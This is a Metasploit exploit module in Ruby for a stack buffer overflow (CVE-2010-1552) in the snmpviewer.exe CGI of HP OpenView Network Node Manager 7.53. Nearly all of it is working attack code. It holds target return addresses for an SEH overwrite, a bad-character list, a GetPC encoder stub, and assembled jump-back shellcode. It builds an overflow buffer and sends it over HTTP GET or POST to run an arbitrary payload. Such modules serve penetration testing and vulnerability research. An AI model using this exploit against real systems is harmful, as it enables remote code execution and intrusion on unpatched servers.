# $Id: hp_nnm_snmpviewer_actapp.rb 12098 2011-03-23 15:47:20Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    HttpFingerPrint = { :method => &#039;HEAD&#039;, :uri => &#039;/OvCgi/snmpviewer.exe&#039;, :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
                prior to NNM_01203. By making a specially crafted HTTP request to the "snmpviewer.exe"
                CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary
                code.
 
                The vulnerable code lies within the a function within "snmpviewer.exe" with a
                timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET
                or POST request. The request must contain &#039;act&#039; and &#039;app&#039; parameters which, when
                combined, total more than the 1024 byte stack buffer can hold.
 
                It is important to note that this vulnerability must be exploited by overwriting SEH.
                While the saved return address can be smashed, a function call that occurs before
                the function returns calls "exit".
            } ,
            &#039;Author&#039;         =>
                [
                    &#039;jduck&#039;   # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12098 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1552&#039; ],
                    [ &#039;OSVDB&#039;, &#039;64975&#039; ],
                    [ &#039;BID&#039;, &#039;40068&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-083/&#039; ],
                    [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02153379&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024, # 1024 byte buffer..
                    &#039;BadChars&#039; =>
                        # Not sure why this one has a different set of bad chars...
                        (
                            (0x00..0x08).to_a + (0x0b..0x1f).to_a +
                            [ 0x21, 0x26, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f ]
                        ).pack(&#039;C*&#039;),
                    &#039;DisableNops&#039; => true,
                    # Manually use FPU to get EIP into ECX
                    &#039;PrependEncoder&#039; => "\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x83\xe9\xf7",
                    &#039;EncoderOptions&#039; => { &#039;BufferRegister&#039; => &#039;ecx&#039; },
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;HP OpenView Network Node Manager 7.53 w/NNM_01201&#039;,
                        {
                            &#039;Ret&#039;     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166
                        }
                    ],
                    [ &#039;HP OpenView Network Node Manager 7.53 (Windows 2003)&#039;,
                        {
                            &#039;Ret&#039;     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959
                        }
                    ],
                    [ &#039;Debug Target&#039;,
                        {
                            &#039;Ret&#039;     => 0xdeadbeef, # crasher
                        }
                    ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;May 11 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
    def exploit
 
        print_status("Trying target #{target.name}...")
 
        cgi = &#039;/OvCgi/snmpviewer.exe&#039;
 
        # "ins" must be "load" or "content"
        ins_ok = [ &#039;load&#039;, &#039;content&#039; ]
        ins = ins_ok[rand(ins_ok.length)]
 
        start = &#039;The specified Application/Action name is not defined.<p>Application:"&#039;
        #middle = &#039;"<p>Action:"&#039;
 
        ia32 = Metasm::Ia32.new
 
        # SEH
        seh_offset = 1192
        seh_frame = rand_text(8)
 
        # Jump back to the payload, after p/p/r jumps to us.
        distance = seh_offset - start.length + seh_frame.length # dry run
        jmp_back = Metasm::Shellcode.assemble(ia32, "jmp $-" + distance.to_s).encode_string
        distance = seh_offset - start.length - jmp_back.length
        distance += 8 if ins == &#039;content&#039;
        jmp_back = Metasm::Shellcode.assemble(ia32, "jmp $-" + distance.to_s).encode_string
 
        # A short jump back to the long jump back :)
        jmp_small = Metasm::Shellcode.assemble(ia32, "jmp $-" + jmp_back.length.to_s).encode_string
 
        # Fix up the SEH frame
        seh_frame[0,jmp_small.length] = jmp_small
        seh_frame[4,4] = [target.ret].pack(&#039;V&#039;)
 
        # Create the buffer
        buf = &#039;&#039;
        buf << payload.encoded
        pad = seh_offset - start.length - buf.length - jmp_back.length
        pad += 8 if ins == &#039;content&#039;
        buf << rand_text(pad)
        buf << jmp_back
        buf << seh_frame
 
        app = buf
 
        # Force an exception writing off the end of the stack
        action = rand_text(1024)
 
        # Send the request
        if rand(2) > 0
            print_status("Sending exploit via POST request (ins=#{ins})...")
            res = send_request_cgi({
                &#039;uri&#039;         => cgi,
                &#039;method&#039;      => "POST",
                &#039;vars_post&#039; =>
                    {
                        &#039;ins&#039; => ins,
                        &#039;act&#039; => action,
                        &#039;app&#039; => app
                    }
            }, 3)
        else
            print_status("Sending exploit via GET request (ins=#{ins})...")
            res = send_request_cgi({
                &#039;uri&#039;         => cgi,
                &#039;method&#039;      => "GET",
                &#039;vars_get&#039; =>
                    {
                        &#039;ins&#039; => ins,
                        &#039;act&#039; => action,
                        &#039;app&#039; => app
                    }
            }, 3)
        end
 
        if res and res.code != 502
            print_error("Eek! We weren&#039;t expecting a response, but we got one")
            print_status(res.inspect) if datastore[&#039;NNM_DEBUG&#039;]
        end
 
        handler
 
    end
 
    def wfs_delay
        5
    end
 
end



